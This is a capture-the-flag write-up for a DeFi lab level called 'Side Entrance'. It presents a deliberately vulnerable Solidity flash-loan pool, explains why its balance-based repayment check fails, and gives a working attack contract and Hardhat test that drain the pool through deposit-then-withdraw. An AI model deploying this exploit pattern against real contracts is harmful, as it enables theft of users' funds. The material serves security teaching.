# 4 - Side Entrance

```solidity
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances; // maybe there could be a problem here

    function deposit() external payable {
        balances[msg.sender] += msg.value; // what if the attacker directly sends ether?
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external { // borrow -> send
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
    }
}
```

### Solution

```solidity
require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");
```

Here, the contract naively checks the balance of the contract itself.

So we will call `deposit` during `flashLoan` function call tx.

After then, the contract still has same amount of balanced but `balances[msg.sender]` has increased, and we just drain the contract by calling withdraw function.

```solidity
contract AttackSideEntranceLenderPool {
    SideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack() external {
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        payable(msg.sender).call{value: address(this).balance}("");
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}

```

```javascript
  it('Exploit', async function () {
    /** CODE YOUR EXPLOIT HERE */
    const AttackSideEntranceLenderPool = await ethers.getContractFactory('AttackSideEntranceLenderPool');
    const attackSideEntranceLenderPool = await AttackSideEntranceLenderPool.connect(attacker).deploy(this.pool.address);
    await attackSideEntranceLenderPool.deployed();

    const tx = await attackSideEntranceLenderPool.attack();
    await tx.wait();
  });
```

Rather than having `deposit()` , the contract should have tracked its balance by using `receive()` function.
